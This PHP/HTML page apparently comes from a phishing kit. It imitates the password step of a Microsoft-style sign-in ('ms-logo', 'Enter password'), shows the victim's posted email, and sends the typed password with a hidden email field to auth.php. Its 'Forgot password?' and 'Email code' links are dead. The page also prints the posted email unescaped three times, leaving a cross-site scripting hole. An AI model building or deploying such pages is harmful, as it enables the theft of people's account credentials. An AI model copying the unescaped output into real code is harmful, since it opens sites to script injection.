<html>
    <head>
      <meta charset="utf-8" />
      <title>Sign in to your account</title>
      <link href="style.css" rel="stylesheet" type="text/css" />
      <link href="img/favicon.ico" rel="shortcut icon" type="image/x-icon" />
    </head>
  <body class="body">
    <div class="centered-block">
      <div class="ms-logo"></div>
      <div class="text-block-2"><?php print($_POST["email"])?></div>
      <h1 class="heading">Enter password</h1>
      <div class="w-form">
        <form method="post" action="auth.php">
          <input type="password" class="text-field w-input" maxlength="256" name="password" placeholder="Password" required="" />
          <input type="email" hidden="" maxlength="256" name="email" value="<?php print($_POST["email"])?>" />
          <div class="text-block"><a href="#" class="link">Forgot password?</a></div>
          <div class="text-block"><a href="#" class="link">Email code to <?php print($_POST["email"])?></a></div>
          <div class="div-block">
            <input type="submit"value="Back" class="cancel-button w-button" />
            <input type="submit" value="Next" class="submit-button w-button" />
          </div>
        </form>
      </div>
    </div>
  </body>
</html>